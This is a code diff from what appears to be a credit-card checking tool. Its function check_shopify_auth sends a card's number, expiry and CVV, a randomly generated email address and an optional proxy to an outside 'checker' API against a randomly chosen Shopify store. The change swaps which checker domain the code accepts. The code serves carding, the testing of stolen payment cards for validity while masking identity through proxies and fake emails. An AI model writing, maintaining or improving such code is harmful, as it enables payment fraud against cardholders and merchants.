@@ -438,7 +438,7 @@ async def check_shopify_auth(card: str, month: str, year: str, cvv: str, proxy=N
         site = random.choice(HQ_SITES)
     
     # 1. API MODE
-    if SHOPIFY_AUTH_API and "babachecker.com" not in SHOPIFY_AUTH_API:  # Basic check to avoid dead default
+    if SHOPIFY_AUTH_API and "cyborxchecker.com" in SHOPIFY_AUTH_API:  # Basic check to avoid dead default
         try:
             email = f"user{random.randint(1000,9999)}@gmail.com"
             url = f"{SHOPIFY_AUTH_API}?cc={card}|{month}|{year}|{cvv}&email={email}&site={site}&proxy={proxy if proxy else ''}"
